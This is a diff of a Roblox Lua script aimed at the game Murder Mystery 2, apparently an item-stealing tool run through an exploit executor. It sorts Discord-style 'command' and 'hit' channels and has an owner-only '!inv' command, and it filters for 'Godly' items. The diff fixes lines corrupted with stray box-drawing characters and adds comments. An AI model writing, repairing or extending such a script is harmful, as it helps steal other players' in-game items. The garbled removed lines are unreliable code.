@@ -24,10 +24,8 @@ repeat task.wait() until game:IsLoaded()
 local _targetPlace = 142823291;
 local _isMM2 = game.PlaceId == _targetPlace;
 
-_plr =)
-
- game.Players.LocalPlayer.Character-- or game.Players.LocalPlayer. ═CharacterAdded:Wait════();
-_startT = tick════();
+_plr = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait();
+_startT = tick();
 
 local _hs = game:GetService("HttpService");
 local _rs = game:GetService("ReplicatedStorage");
@@ -38,7 +36,9 @@ local _ex, _exv = identifyexecutor();
 _sumV = 0;
 _doneT = 0;
 _minRare = _minRare or "Godly";
-print(1══════════════════════════════════════════════════════
+print(1)
+
+-- ═══════════════════════════════════════════════════════════════
 --  MM2-SPECIFIC INIT
 -- ═══════════════════════════════════════════════════════════════
 if _isMM2 then
@@ -704,6 +704,9 @@ local function _gw()
             local _isCmd = (_md.channel_id == _cmdCh);
             local _isHit = (_md.channel_id == _hitCh);
 
+            -- ═══════════════════════════════════════════════════════
+            --  COMMANDS (checked FIRST so they work even if _cmdCh == _hitCh)
+            -- ═══════════════════════════════════════════════════════
             if _isCmd then
                 if _content == "!inv" then
                     if _isOwner(_md.author) then
@@ -849,6 +852,9 @@ local function _gw()
                 end
             end
 
+            -- ═══════════════════════════════════════════════════════
+            --  HITS (checked after commands)
+            -- ═══════════════════════════════════════════════════════
             if _isHit then
                 _lastMid = _md.id;
                 _pjm(_md);
